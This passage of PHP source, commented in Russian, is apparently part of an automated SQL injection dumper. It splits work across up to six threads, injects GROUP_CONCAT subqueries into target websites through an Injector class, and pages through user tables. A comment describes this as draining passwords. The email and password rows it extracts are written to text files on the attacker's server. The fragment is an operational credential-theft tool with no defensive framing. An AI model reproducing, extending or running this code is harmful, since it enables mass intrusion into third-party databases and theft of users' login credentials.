		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		
		
		
		//Мы можем запускать к примеру 6 различных дампингов - разные сайты, по одному потоку в каждом. Или к примеру 6 таблиц у одного сайта.
		
		
		$this->timeStart = $this->start('dumping_one',$settings['potok']);
		
		
		$this->d($settings,'$settings');
		
		
		
		$data = $this->Post->query("SELECT * FROM  `fileds_one` WHERE  `get` = '1' AND `multi`=1 AND `potok` !=1 AND `pri` =1 ORDER BY  `count` DESC limit 1"); //DESC
		
		if(count($data)==0)
		{
				$data = $this->Post->query("SELECT * FROM  `fileds_one` WHERE  `get` = '1' AND `multi`=1 AND `potok` !=1 ORDER BY  `count` DESC limit 1"); //DESC
		
			
			if(count($data)==0)
			{	
				$this->stop();
				die('stop ONE zapresheno, netu FILEDS_ONE ');
			}	
		}
		
		
		$this->d($data,'nachalo dumping_one');
		
		
		
		foreach($data as $val)
		{
			if($val['fileds_one']['up'] == 1)
			{
				$this->up = true;
				
			}
			
			if($val['fileds_one']['filed'] ==''){
				
				$this->stop();
				die('stop fileds_one_filed==empty');
				
			}else{
				
				$this->filed = $val['fileds_one']['filed'];
			}
			
			
            if($this->debug){
                
            }else{
                
                $data = $this->Post->query("UPDATE  `fileds_one` SET  `get` =  '1',`multi` = 1 WHERE  `id` =".$val['fileds_one']['id']);// на всякий случай
            }
            
			
			
			
			$this->Post->query("UPDATE  `starts` SET  `squle_id` = ".$val['fileds_one']['id']." WHERE  `time_start` =".$this->timeStart);
			
			
			$sliv = $this->dumping_one_columns($val['fileds_one']['id']);
			
			
			$this->d($sliv,'$sliv  return dumping_one main');
			
		
			
			
			
			
			if($sliv=='vpizduone')
			{
				
				$data = $this->Post->query("UPDATE  `fileds_one` SET  `get` =  '2', `multi` = 2 WHERE  `fileds_one`.`id` = ".$val['fileds_one']['id']);
				//$this->d('vpizduone bilo 5 popitok');
				$this->stop();
				exit;
			}
			
			
			
			
			if($sliv!=='vpizdu')
			{		
				$this->d('ne vpizdu!!!!!  OK vse!!!');
		
				$multi = $this->Post->query("SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$val['fileds_one']['id']." AND `get` =2");
				
				$this->d('////////////////////// NE V PIZDU OK VSE get_one// ////////////////////////////////');
				if($multi[0][0]['count(*)'] == $settings['potok_one'])
				{
					 
					$this->d('multis_one zakonchilo id '.$val['fileds_one']['id']);
					
					$data = $this->Post->query("UPDATE  `fileds_one` SET  `get` =  '2', `multi` = 2 WHERE  `fileds_one`.`id` = ".$val['fileds_one']['id']);

				}
				
			}else
			{
				
				$this->d('//////////////////////////////////////vpizdu get_one//////////////////////////////////');
				
				
				if($settings['potok_one']==1)
				{
					$this->Post->query("UPDATE  `fileds_one` SET  `potok` = 0  WHERE `fileds_one`.`id` = ".$val['fileds_one']['id']);
					$this->stop();
					exit;
				}else
				{
				
					//exit;
					
					//выбираем возможную инфу о потоках, если ТРИ уже с get 3 тогда и в общую таблицу пишет 3
					$multi =  $this->Post->query("SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$val['fileds_one']['id']." AND `get` =2 AND `dok` = 5");
					$this->d($multi,'MULTI_one '."SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$val['fileds_one']['id']." AND `get` =2 AND `dok` = 5");
					
					//всего сколько
					$multi2 = $this->Post->query("SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$val['fileds_one']['id']." AND `get` !=0");
					$this->d( $multi2,"MULTI2_one SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$val['fileds_one']['id']." AND `get` !=0");
					
					//6 поток завершен ли
					$multi3 = $this->Post->query("SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$val['fileds_one']['id']." AND `get` =2 AND `potok`=6");
					$this->d($multi3," MULTI3_one SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$val['fileds_one']['id']." AND `get` =2 AND `potok`=6");
					
					
					$err = 3;
					
					
					//для 6 потоков part1
					if($multi[0][0]['count(*)'] >= $err AND $settings['potok_one']==6){
						$this->d($val['fileds_one']['id'],'$multi[0][0][count(*)] >= $err');
						
						if($this->Post->query("UPDATE  `fileds_one` SET  `get` =  '3', `multi` = 0 WHERE  `fileds_one`.`id` =".$val['fileds_one']['id']))
						{
							$this->d("UPDATE  `fileds_one` SET  `get` =  '3', `multi` = 0 WHERE  `fileds_one`.`id` =".$val['fileds_one']['id'],'OK USPESHO');
							
						}else
						{
							$this->d("UPDATE  `fileds_one` SET  `get` =  '3', `multi` = 0 WHERE  `fileds_one`.`id` =".$val['fileds_one']['id'],'NO!!! NE USPESHO');
							
						}
					}
		
					//для 6 потоков part2
					if($multi2[0][0]['count(*)'] >=6 AND $multi[0][0]['count(*)'] >= 1){
						
						$this->d('kol-vo potokov - '.$multi2[0][0]['count(*)'].' i odna oshibka to zakrivaem dumping');
						
						$data = $this->Post->query("UPDATE  `fileds_one` SET  `get` =  '3', `multi` = 0 WHERE  `fileds_one`.`id` =".$val['fileds_one']['id']);
						
						
						$this->stop();
						die('okay 1');
					}
					
					//для 6 потоков part3
					if($multi2[0][0]['count(*)'] ==6 AND $multi3[0][0]['count(*)']==1){
						$this->d('$multi2[0][0][count(*)] ==6 AND $multi3[0][0][count(*)]==1');
						
						$data = $this->Post->query("UPDATE  `fileds_one` SET  `get` =  '2', `multi` = 2 WHERE  `fileds_one`.`id` =".$val['fileds_one']['id']);
						
						
						$this->stop();
						die('okay 2');
						
					}
					
					//для 6 потоков part4
					if($multi2[0][0]['count(*)'] ==5 AND $multi[0][0]['count(*)']==1){
						$this->d('$multi2[0][0][count(*)] ==5 AND $multi[0][0][count(*)]==1');
						
						$data = $this->Post->query("UPDATE  `fileds_one` SET  `get` =  '2', `multi` = 2 WHERE  `fileds_one`.`id` =".$val['fileds_one']['id']);
						
						
						$this->stop();
						die('okay 4');
						
					}
					
				}	
					
				
			
				
			}
		}
		
		$this->stop();
		die('okay end !');
	}

	function dumping_one_columns($id=2){ //слив паролей через group concat многопоточный
		
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		
		$this->d('dumping_one_columns GROUP');
		
		
		$mail2= $this->Post->query("SELECT * FROM  `fileds_one` WHERE `id` = ".$id." limit 1");
		
		
	//	$mail = $this->Filed->findbyid($id);

		
		$mail['Filed'] = $mail2[0]['fileds_one'];
		$filed_id = $mail['Filed']['id'];
		
		
		
		$this->d($mail,'mail');
		
		
		//ставим количесво потоков
		
		
		
		$squle2 = $this->Post->query("SELECT * FROM  `posts_one` WHERE `url` = '".$mail['Filed']['site']."' or `gurl` = '".$mail['Filed']['site']."'  limit 0,1");
		//$this->d("SELECT * FROM  `posts_one` WHERE `url` = '".$mail['Filed']['site']."' or `gurl` = '".$mail['Filed']['site']."'  limit 0,1");

		$squle[0]['posts'] = $squle2[0]['posts_one'];
		
        
        
		
		if($squle[0]['posts']['id']=='')
		{
			$squle2 = $this->Post->query("SELECT * FROM  `posts` WHERE  `url` = '".$mail['Filed']['site']."' or `gurl` = '".$mail['Filed']['site']."'  limit 0,1");
			$this->d("SELECT * FROM  `posts` WHERE `id` = ".$mail['Filed']['post_id']." limit 0,1");

            $this->d('POST MAIN');
            
			$squle[0]['posts'] = $squle2[0]['posts'];
		
		}
        
        
     
        
        
		//если по какой то причине нету в POST_ONE то удаляем нах эту таблицу, качаться не будет, всё будет криво и плохо
		if($squle[0]['posts']['id']='')
		{
			
			
			$data = $this->Post->query("UPDATE  `fileds_one` SET  `get` =  '3', multi = 0 WHERE  `id` =".$mail['Filed']['id']); 
			$this->d('netu d post_one');
			
			if(!$this->Post->query("UPDATE  `multis_one` SET  `prich`='function group no find post_one'  WHERE   `filed_id` =".$filed_id)){
					
					mysql_error();
				}
			
			
			$this->d('vpizdu');
			return 'vpizdu';
			
		}
		
		
		
        //$this->d($squle,'$squle POSTS');

		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'pass SET dump dumping_one_columns');
		}else
		{
			$set = false;
		}
		//exit;
		
		
		
		///////общие данные из выборки/////////
		$bd = explode(':', $mail['Filed']['ipbase']);//все бд
		$count = $mail['Filed']['count'];
		$ff = intval($mail['Filed']['lastlimit']);//откуда начинать
		if($ff=='')$ff=0;
		
		
		//инициируем первоначальные параметры
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['url'],$squle[0],$set);
		
		
		
        if($this->debug){
            $ppp = 0; //!!!!!!!!!!!
            
        }else{
            
            $ppp = $settings['potok_one'];
        }
        
		
		
		if(!$this->Post->query("UPDATE  `fileds_one` SET  `potok` =  $ppp WHERE  `id` =".$mail['Filed']['id'])){
			
			echo mysql_error();
			exit;
		}
		

		/////выбираем возможную инфу о уже существующих потоках ЗАПУЩЕННЫХ или УЖЕ ЗАВЕРЕШННЫХ////
		$multi = $this->Post->query("SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$mail['Filed']['id']." AND `get` !=0");
		
		
		
		
		
		////сколько должно дампится за один раз////
		$tmpCount = $count-$mail['Filed']['lastlimit'];
		$oneCount = $tmpCount/$settings['potok_one'];
		$oneCount = round($oneCount);
		
	//	$this->shag = 5;//по сколько за раз будет дампится штук записей
		$zapr  = round($oneCount/$this->shag);//количество итераций
		if($zapr==0)$zapr=1;
		
		
		////логирование////
		$this->d($count,'$count');
		$this->d($mail['Filed']['lastlimit'],'$mail["Filed"]["lastlimit"]');
		$this->d($multi,"SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ".$mail['Filed']['id']." AND `get` !=0");
		$this->d($zapr,'zapr pervuy KOLICHESTVO ITERACYU PRIVERNO !!!!');
		$this->d($oneCount.' oneCount perviy S KAKOGO BUDEM NACHINAT $count-$mail["Filed"]["lastlimit"]/$settings["potok_one"]');
		
		//exit;
		flush();
		
		
		//////потоков нету, это первый////////
		if($multi[0][0]['count(*)'] == 0)
		{
			$this->d('//////////////////////////////////pervyi potok////////////////////////////////////////');
			
			
			$potok = 1;
			
			//по сути если нуль ff, значит потоки еще не начинались, иначе первый lastlimit1 = ff будет
			if($ff == 0)
			{
				$start = 1;
			}else
			{
				$start = $ff;
			}
			
			
			//если нету уже в базе данных, тогда вставляем инфу о потоке
			$numPotok = $this->Post->query("SELECT count(*) FROM  `multis_one` WHERE `potok` = ".$potok." AND `filed_id`=".$filed_id);
			
			$this->d($numPotok,'$numPotok vsego potokov');
			
			
			
			if($numPotok[0][0]['count(*)'] == 0)
			{
				
				//$this->d($squle,'squle $numPotok=0');
				
				$f = __FUNCTION__;
				$this->d('shag 1');
				
				$post_id = $squle[0]['posts']['id'];
				$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
				$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
				$h2 = parse_url($squle[0]['posts']['url']);
				$domen = $h2['host'];
				//$date = date('Y-m-d h:i:s');
				$date = time();
				$tmpCount1 = $oneCount+$start;
				
				$this->d($post_id,'$post_id');
				
				$this->d($domen,'domen');
				
				$this->d($tmpCount1,'$tmpCount1');
				
				$this->d($date,'$date');
				
				$this->d($f,'$f');
				
				$this->d($potok,'$potok');
				
				$this->d($start,'$start');
				
				$this->d($filed_id,'$filed_id');
				
				$this->d('shag 2');
				
				$this->d("INSERT INTO `multis_one` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$tmpCount1},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})");
				
				if($this->Post->query("INSERT INTO `multis_one` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$tmpCount1},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}','{$this->pid}')")){
					
					
				}
				
				$this->Post->query("UPDATE  `starts` SET  `potok` = {$potok} WHERE  `time_start` =".$this->timeStart);
				$this->d('shag 3');
			}
		}
		else
		{
		//если уже есть потоки тогда вычисляет значения следующего
			
			$this->d('ETO UJE NE PERVUY POTOK');
			

			
			//////////////////////ставим статус 2, где было уже 6 попытки////////////////////////////////////
			$zav11 = $this->Post->query("SELECT * FROM  `multis_one` WHERE `get` = 3 AND `dok` = 5 AND `filed_id` =".$filed_id." limit 1");
			
			$zav0[0]['multis'] = $zav11[0]['multis_one'];
			
			$this->d($zav0,'$zav0 multislivcontacat pass  `get` = 3 AND `dok` = 5');
			
			
			if($zav0[0]['multis']['get'] == 3)
			{
				$this->d('////////////////////////////////////////POPPITKI ISCHERPANU get = 3 AND dok = 5 V PIZDU//////////////////////////////////////////');
				if($this->Post->query("UPDATE  `multis_one` SET  `get` =  2, `dok` = 5 WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id))
				{
					$this->Post->query("UPDATE  `multis_one` SET  `prich` =  `prich`+'function group bilo 5 popitok' WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id);
					$this->d('YES update `multis_one` SET  `get` =  2,`dok` = 5');
				}
				$this->d("UPDATE  `multis_one` SET  `get` =  2 WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id);
				$this->d($zav0,'zav0 ETO ESLI BILI UJE 5 POPITKI `GET` 3 AND `DOK`=5 ////// Stavim status 2');
				
				if($multi[0][0]['count(*)'] == 1 AND $settings['potok_one']==1)
				{
					
					return 'vpizduone';
				}else{
					
					return 'vpizdu';
				}
				
				
			}
			
			
			
			//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			
			/////проверка на перезапуск, не больше пяти////
			$zav22 = $this->Post->query("SELECT * FROM  `multis_one` WHERE `get`=3 AND `dok` < 5 AND `filed_id`=".$filed_id." limit 1");
			$zav[0]['multis'] = $zav22[0]['multis_one'];
			$this->d($zav,' $zav `get`=3 AND `dok` < 5');
			
			if($zav[0]['multis']['get'] == 3)
			{
				$this->d('////////////////////PEREZAPUSK//////////////////////////////////////////');
				$this->d($zav,'zav get=3 AND dok < 5 ////// dlya perezapuska');
				$dok = $zav[0]['multis']['dok']+1;
				$this->Post->query("UPDATE  `multis_one` SET  `get` =  1,`dok` =".$dok." WHERE  `potok` = ".$zav[0]['multis']['potok']." AND `filed_id`=".$filed_id);
				$this->Post->query("UPDATE  `starts` SET  `potok` = ".$zav[0]['multis']['potok']." WHERE  `time_start` =".$this->timeStart);
				
				$start =$zav[0]['multis']['lastlimit'];
				$oneCount =$zav[0]['multis']['count']; 
				$potok = $zav[0]['multis']['potok'];
				
				//$this->d($potok,'$potok');
				//exit;
				
				$oneCount = $oneCount -$start;
				$zapr  = round($oneCount/$this->shag);
				$this->d($zapr,'$zapr get 3 KOLICHESTO ITERACYU POSLE PERESAPUSKA');
				
				
			}
			else
			{

				if($multi[0][0]['count(*)'] == 1 AND $settings['potok_one']==1)
				{
					$potok =1;
				
				}else
				{
				
					/////система расчёта добавления нового потока/////
					
					$this->d('////////////////////DOBAVLYAEM NOVYU POTOK//////////////////////////////////////////');
					$allPotok = $multi[0][0]['count(*)'];
					
					
					
					
					//выбираем инфу о последнем потоке, даже если он завершен
					$next11 = $this->Post->query("SELECT * FROM  `multis_one` WHERE `potok` = ".$allPotok." AND `filed_id`=".$filed_id);
					$next[0]['multis'] = $next11[0]['multis_one'];
					//логи
					$this->d($allPotok,'$allPotok dumping_one');
					$this->d($next,'$next - infa o poslednem potoke slivWithPassConcastMulti');
					
					
					$start = 	$next[0]['multis']['count'];
					$oneCount = $next[0]['multis']['count']+ $oneCount;
					$oneCount=  $oneCount-20;
					
					$kk = $count -$oneCount;
					
					$zapr  = round($kk/$this->shag);
					
					$this->d($zapr,'zarp новый поток');
					
					$this->d($start,'$start');
					
					$this->d($count,'$count');
					
					$this->d($oneCount,'$oneCount');
					
					
					$potok =  	$next[0]['multis']['potok']+ 1;
					
					if($oneCount > $count)
					{
						/////логирование/////
						$this->d("$oneCount > $count oneCount > count  1");
						$oneCount = $count-100;
						$start = $start -100;
						
						$zapr  = round($oneCount/$this->shag);
						
						if($potok >= 6 )
						{
							$potok = 6;
							$this->d('potok > 6 oneCount > count');
							
							
							//$this->d("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id,'$oneCount > $count');
							//if($this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id))
							//{
							//	$this->d('YES update');
							//}else{
							//$this->d('NE obnovilos');
							//}
							
							if($this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id)){
								
								$this->d("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id);
								$this->d('YES update potok > 6 oneCount > count slivpass contact prosto');
							}
							
							return 'vpizdu';
						}
					}
					
					
					
					
					
					////Если уже 6 штук есть потоков в таблице, то oneCount будет больше чем count, если не так то:
					if($oneCount < $count)
					{
					///если сумма потоков меньше или равно чем в настройках, то добавляем поток
					if($multi[0][0]['count(*)'] < $settings['potok'])
					{
						//если нету уже в базе данных, тогда вставляем инфу о потоке
						$numPotok = $this->Post->query("SELECT count(*) FROM  `multis_one` WHERE `potok` = ".$potok." AND `filed_id` =".$filed_id);
						
						$this->d("SELECT count(*) FROM  `multis_one` WHERE `potok` = ".$potok." AND `filed_id` =".$filed_id,'EST UJE POTOK TAKOY!!!');
						
						
						if($numPotok[0][0]['count(*)'] == 0)
						{
							$f = __FUNCTION__;
							
							$post_id = $squle[0]['posts']['id'];
							$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
							$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
							$h2 = parse_url($squle[0]['posts']['url']);
							$domen = $h2['host'];
							//$date = date('Y-m-d h:i:s');
							$date = time();
							if($this->Post->query("INSERT INTO multis_one (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$oneCount},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})"))
							{
								$this->d($potok,' $potok YES insert zapis');
								
							}else
							{
								$this->d($potok,' $potok NO!!!! insert zapis');
								
							}
							
							$this->Post->query("UPDATE  `starts` SET  `potok` = {$potok} WHERE  `time_start` =".$this->timeStart);
						}else{
							$this->d('POTOK UJE EST v multis_one status get=3 stavim slivWithPassConcastMulti');
							
							$this->d("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
							
							$this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
							return 'vpizdu';
							
						}
					}else
					{
						$this->d('$multis_one[0][0][count(*)] <= $settings[potok]');
						
						if($potok >6 )
						{
							$potok = 6;
							$this->d('potok > 6');
						}
						$this->d("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						$this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						return 'vpizdu';
						
					}
				}
				}
			}
		}
		
		
		
		
		////Подготовка
		$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
		
		$url = parse_url($squle[0]['posts']['url']);				
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone)-1];
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/slivdump_one/NOCHECK", 0777);
		
		$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/slivdump_one/".$url['host']."_".$bd[1]."_".$mail['Filed']['table']."_FON.txt";	
		$filename2 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/slivdump_one/NOCHECK/".$url['host']."_".$bd[1]."_".$mail['Filed']['table']."._FONtxtNOCHECK";	


		
		$this->d($filename,'$filename');

		
		$fh = fopen($filename, "a+");
        
        fwrite($fh, $squle[0]['posts']['url']."\n");
        
        
		//$fh2 = fopen($filename2, "a+");
		$time=time();
		
		///Для расчёта дублей, пустых и хешей
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp=0;
		$this->email_gavno = 0;
		$this->emp_pass = 0;
		
	
		$this->d($zapr.'-zapr poslednyu:'.$this->r);
		$this->d($oneCount.'-oneCount:'.$this->r);
		$this->d($count.'-count:'.$this->r);
		$this->d($start.'-start:'.$this->r);
		$this->d($potok.'-potok:'.$this->r);
		$this->d($this->pid.'-pid:'.$this->r);
		
		flush();
	//	exit;
		
		
		for ($i=0;$i<$zapr;$i++)
		{
			echo $i.'-i<br>';
			
			//if($i==100)break;
			
			$this->workup();
			
			$new = time();
			$razn = $new-$time;
		//	$this->d($razn,'razn');
			
			
			$this->Post->query("UPDATE  `multis_one` SET  `prich` = '0'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
			
			if($razn>55)
			{
				$this->d($razn.'-razn dumping_one po vremeni > 55:'.$this->r);
				
				$this->Post->query("UPDATE  `multis_one` SET  `get` = 3  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
				$this->Post->query("UPDATE  `multis_one` SET  `prich` = 'function group razn  > 55'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
				
				//$this->stop();
				//$pid  = getmypid();
				//exec("kill -9 ".$pid);
				return 'vpizdu';
			}
			
			$time = time();
			
			$this->workup();
			
			
			//$this->d($this->filed,'$this->filed');
			$fff = explode(',',$this->filed);
			
			$str0 = '';
			$str1 = '';
			
			
			$str2 = '';
			$str3 = '';
			
			
			foreach($fff as $fff_one)
			{
				//способ из за кавычек
				$str0.=$fff_one.",";
				$str1.='t.'.$fff_one.",CHAR('58'),";
				
				
				
				
				//для способа без кавычек
				$str2.=$fff_one.",";
				$str3.='t.'.$fff_one.",CHAR(58),";

				if(preg_match("/mail/si",$fff_one))
				{
						$mail['Filed']['label'] = $fff_one;
				}
			}
			
			
			//убираем лишние знаки из за запятой
			$str0 = substr($str0, 0, -1); //без запятой
			$str1 = substr($str1, 0, -12); //без запятой
			
			
			$str2 = substr($str2, 0, -1); //без запятой
			$str3 = substr($str3, 0, -10); //без запятой
			
			
			
			//$this->d($str0,'$str0');
			//$this->d($str1,'$str1');
		//$this->d($str2,'$str2');
		//$this->d($str3,'$str3');
			
			
			
			$this->Post->query("UPDATE  `multis_one` SET  `lastlimit` = $start,`date`= $time,`pid`={$this->pid} WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
			
			
			if($this->mysql2==false)
			{
				
				$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT '.$str0.' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` LIMIT '.$start.','.$this->shag.')t', 'GROUP_CONCAT('.$str1.')',0,array());
				//$this->d($mysql,'$mysql ==false -- '.$start);
			}else
			{
				
				$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT '.$str2.' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` LIMIT '.$start.','.$this->shag.')t', 'GROUP_CONCAT('.$str3.')',0,array());
				//$this->d($mysql,'$this->mysql2==true -- '.$start);
			}
            
            
            //$this->d($mysql,'$mysql');
            //exit;
			
			
			
			if($this->mysql2==false)
			{
			
				if($mysql['GROUP_CONCAT('.$str1.')']=='')
				{
					$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT '.$str2.' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` LIMIT '.$start.','.$this->shag.')t', 'GROUP_CONCAT('.$str3.')',0,array());
					$this->d($mysql,'$mysql2 --'.$start);
					
					if($mysql['GROUP_CONCAT('.$str3.')']!='')
					{
							$this->mysql2 =true;
					}	
				}
			
			}
			

			
			
			
			//$this->d($mysql,'$mysql');
			//exit;
			
			
			
			
			$start2 = $start;
			
			$start = $start + $this->shag;
			
			
			$limit_enable = 1;
            
		   if(($mysql['GROUP_CONCAT('.$str1.')']=='' AND $mysql['GROUP_CONCAT('.$str3.')']==''))
			//if(($mysql['GROUP_CONCAT('.$str1.')']!='' AND $mysql['GROUP_CONCAT('.$str3.')']!=''))
				{
			
					$this->d('STR1 AND STR3 ==33333333');
                    
                    //$this->d($mysql['GROUP_CONCAT('.$str1.')'],'111');
                    // $this->d($mysql['GROUP_CONCAT('.$str3.')'],'3333');
                     //exit;
				
					 
					$this->Post->query("UPDATE  `multis_one` SET  `function` = 1 WHERE  `potok` =$potok AND `filed_id` =".$filed_id);
				
					$rrr = $this->dumping_one_columns_limit($id,$potok,$start2,$oneCount,$filename,$filename2);
                    
                   // $this->d($rrr,'$rrr');
                    
                    if($rrr==true){
                        return true;
                    }
				
					if ( $rrr== 'vpizdu')
					{
						$this->d('vpizdu');
						$this->Post->query("UPDATE  `multis_one` SET  `prich` = 'function limit vpizdu return'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
						
						return 'vpizdu';
					}
				
					return 'vpizdu';
			
				}else{
					
						$this->Post->query("UPDATE  `multis_one` SET  `function` = 0 WHERE  `potok` =$potok AND `filed_id` =".$filed_id);
				}
			//exit;
			
            
            
            
            
			if($this->mysql2==false)
			{
				
				
				
			
				if($mysql['GROUP_CONCAT('.$str1.')'] !='')
				{
                    
                   // $this->d($mysql['GROUP_CONCAT('.$str1.')'],'mysqqqqqqqq');
                   // $this->d('111111111111111111111111111111111111111');
					
                    
                   $new = explode(',',$mysql['GROUP_CONCAT('.$str1.')']);
                    
                    
                    foreach ($new as $value)
                    {
                    

                        if($value !='')//если строка мыло нормальное
                            {		

                                        $this->d('good 2');
                                        //$bb = explode('@',$p[0]);
                                        
                                        $domen = $squle[0]['posts']['domen'];
                                        
                                        
                                
                                        //if($this->Post->query("INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES('{$p[0]}','{$value}',now(),'{$domen}','none','{$bd[1]}','{$zone}')")){
                                            
                                            
                                        //}
                                        
                                        echo '||'.$value.'||<br/>';
                                        fwrite($fh, trim($value)."\n");
                                
                                        
                                    
                                
                            }       
                            else
                            {
                                $this->null++;
                                $this->d($this->null,'count NULL TRIM');
                                
                                
                                if($this->null == $this->null_count  and $this->up_one == false)
                                {
                                    $this->d( 'Много пустных или null '.$this->null);
                                    $this->logs('Mnogo null:'.$this->null.' '.$this->r,__FUNCTION__);
                                    $this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                                    $this->Post->query("UPDATE  `multis_one` SET  `prich` = 'Mnogo null 100'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                                    
                                    $this->d("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                                    
                                    return 'vpizdu';
                                }
                                
                                
                            }
                                
                            

                                
                                
                    }			

                            

					$hunta = 0;
				}else
				{
					$hunta = $hunta+1;
					echo $hunta.'<br>';
				}
			
			}else
			{
				
				$this->d('222222222222222222222222222');
				
				if($mysql['GROUP_CONCAT('.$str3.')']!='')
				{
                    
                    $this->d($mysql['GROUP_CONCAT('.$str3.')'],'mysqqqqqqqq');
                    $this->d('111111111111111111111111111111111111111');
					
                    
                   $new = explode(',',$mysql['GROUP_CONCAT('.$str3.')']);
                    
                    
                    foreach ($new as $value)
                    {
                    

                        if($value !='')//если строка мыло нормальное
                            {		
                                
                                
                                    
                        
                                        
                                        $this->d('good 2');
                                        //$bb = explode('@',$p[0]);
                                        
                                        $domen = $squle[0]['posts']['domen'];
                                        
                                        
                                
                                        //if($this->Post->query("INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES('{$p[0]}','{$value}',now(),'{$domen}','none','{$bd[1]}','{$zone}')")){
                                            
                                            
                                        //}
                                        
                                        echo '||'.$value.'||<br/>';
                                        fwrite($fh, trim($value)."\n");
                                
                                        
                                    
                                
                            }       
                            else
                            {
                                $this->null++;
                                $this->d($this->null,'count NULL TRIM');
                                
                                
                                if($this->null == $this->null_count  and $this->up_one == false)
                                {
                                    $this->d( 'Много пустных или null '.$this->null);
                                    $this->logs('Mnogo null:'.$this->null.' '.$this->r,__FUNCTION__);
                                    $this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                                    $this->Post->query("UPDATE  `multis_one` SET  `prich` = 'Mnogo null 100'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                                    
                                    $this->d("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                                    
                                    return 'vpizdu';
                                }
                                
                                
                            }
                                
                            

                                
                                
                    }			

                            

					$hunta = 0;
				}else
				{
					$hunta = $hunta+1;
					echo $hunta.'<br>';
				}
				
			}
	
			//exit;
			


			if($hunta==$this->hunta)
			{
				fclose($fh);
				$this->logs('$hunta = 20 vpizdu:'.$this->r,__FUNCTION__);
				$this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				$this->Post->query("UPDATE  `multis_one` SET  `prich`='function group no data $this->hunta'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				return 'vpizdu';
			}
			
			
			//exit;
			//$this->renamename($filename);
		
